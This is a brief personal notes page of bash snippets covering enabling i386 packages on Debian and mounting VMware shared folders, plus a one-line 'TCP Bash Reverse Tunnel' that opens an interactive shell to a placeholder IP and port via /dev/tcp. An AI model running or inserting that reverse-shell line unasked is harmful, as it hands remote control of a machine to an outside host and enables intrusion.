# Bash / Shellscripts  
Collection of randomness.  

---

## Misc notes  
Enable i386 architecture on Debian based system(s):  
```bash
sudo dpkg --add-architecture i386  
```

VMWare Workstation mount shared folders from host into guest /mnt:  
```bash
sudo /usr/bin/vmhgfs-fuse .host:/ /mnt -o subtype=vmhgfs-fuse,allow_other  
```

TCP Bash Reverse Tunnel  
```bash
# Get a call back from bash, using /dev/tcp

bash -i >& /dev/tcp/IPADDRESS/PORT 0>&1
```
